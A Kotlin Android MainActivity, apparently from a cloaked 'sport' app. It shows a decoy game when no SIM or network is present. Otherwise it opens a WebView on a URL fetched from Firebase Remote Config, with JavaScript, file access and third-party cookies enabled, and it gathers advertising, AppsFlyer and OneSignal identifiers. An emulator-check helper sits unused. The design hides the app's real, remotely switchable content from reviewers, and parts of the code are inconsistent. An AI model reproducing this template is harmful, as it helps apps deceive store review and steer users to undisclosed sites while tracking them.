package com.homesports.sportfuntilt

import android.content.Context
import android.content.Context.CONNECTIVITY_SERVICE
import android.content.Context.TELEPHONY_SERVICE
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Uri
import android.os.Bundle
import android.telephony.TelephonyManager
import android.view.MotionEvent
import android.view.View
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat.getSystemService
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import kotlinx.coroutines.*


class MainActivity : AppCompatActivity() {

    lateinit var preferences: Preferences
    var uploadMessage: ValueCallback<Array<Uri>>? = null
    lateinit var webView: WebView
    var url = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        preferences = Preferences.create(this)


        if (isNet() && sim()) {
            if (preferences.url != "no" && !preferences.url.isNullOrEmpty()) {
                println("Ссылка уже есть")
                startWebview()
            } else {
                println("Ссылки ещё нет")
            }
            startWebview()
        } else startGame()

    }

    private fun startGame() {
        val intent = Intent(this, GameActivity::class.java)
        startActivity(intent)
        finish()
    }

    private fun startWebview() {
        webviewLogic()
    }

    private fun webviewLogic() {
        webView = findViewById(R.id.webview)
        webView.settings.javaScriptEnabled = true
        webView.settings.loadWithOverviewMode = true
        webView.settings.useWideViewPort = true
        webView.settings.allowFileAccess = true
        webView.settings.allowContentAccess = true


        val cookieManager = CookieManager.getInstance()
        cookieManager.acceptCookie()
        cookieManager.setAcceptThirdPartyCookies(webView, true)
        cookieManager.setAcceptThirdPartyCookies(webView, true)
        webView.setOnTouchListener(object : View.OnTouchListener {
            override fun onTouch(v: View?, event: MotionEvent?): Boolean {
                cookieManager.flush()
                return v?.onTouchEvent(event) ?: false
            }
        })

        val webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView,
                filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                uploadMessage = filePathCallback
                val intent = Intent(Intent.ACTION_GET_CONTENT)
                intent.addCategory(Intent.CATEGORY_OPENABLE)
                intent.type = "image/*"
                startActivityForResult(
                    Intent.createChooser(intent, "File Chooser"),
                    1
                )
                return true
            }
        }

         fun getid() {
            var viewModelJob = Job()
            val uiScope = CoroutineScope(Dispatchers.Main + viewModelJob)
            uiScope.launch {
                //Do background tasks...
                withContext(uiScope.coroutineContext) {
                    val final = withContext(Dispatchers.IO) {
                        //Do background tasks...
                        val adInfo =
                            AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext())
                        val adId = adInfo?.id
                        adId
                    }
                    print("РЕЗУЛЬТАТ $final")
                }
            }
        }

        fun getid1()=GlobalScope.async {
                        val adInfo =
                            AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext())
                        val adId = adInfo?.id
               adId
           }

        fun getover(){
            GlobalScope.launch {(Dispatchers.Main)
                val comprl = getid1()
                val output = comprl.await()
            }
        }



        val parameter = Settings.it().preferences.deepLink
        val appsfly = Settings.it().dopParametrAppsFlyer()
        val company = Settings.it().dopParametrCompanyName()
        val onesignalid = Settings.it().SIGNAL_ID
        getover()


        println("Параметр апсфлаер айди ${appsfly}")
        println("Параметр компани ${company}")
        println("Параметр он сигнал айди ${onesignalid}")


        //адрес гарантировано присутствует
        val url1 = Settings.it().preferences.url!!

        //если параметр присутствует то конкатинируем его к адресу, иначе - открываем адрес без параметра
        val finalUrl = if (parameter.isNullOrEmpty()) url
        else "${url1}?link=$parameter"


        val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 1200
        }
        remoteConfig.setConfigSettingsAsync(configSettings)

        remoteConfig.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isComplete) {
                    url = remoteConfig.getString("URL")
                    if (!url.isNullOrEmpty()){
                        preferences.storeUrl(url)
                        webView.loadUrl(finalUrl)
                    }else if(url.isEmpty()){
                        startGame()
                    }
                }
            }

        //открываем сайт
        webView.webChromeClient = webChromeClient
        println("ссылка ${finalUrl}")
        println("ссылка изеначальная ${url1}")
        webView.loadUrl(finalUrl)

        webView.webViewClient = object : WebViewClient() {
            @Deprecated("Deprecated in Java")
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                return false
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1) {
            if (uploadMessage == null) return
            uploadMessage!!.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent))
            uploadMessage = null
        }
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }

    private fun sim(): Boolean {
        var telephone: TelephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        val simStateMain: Int = telephone.simState
        if (simStateMain == TelephonyManager.SIM_STATE_ABSENT) {
            return false
        }
        return true
    }

    private fun isNet(): Boolean {
        val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        return cm.activeNetworkInfo != null && cm.activeNetworkInfo!!.isConnected
    }

    fun em():Boolean{
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val networkOperator = tm.networkOperatorName
        return "Android" == networkOperator
    }

}
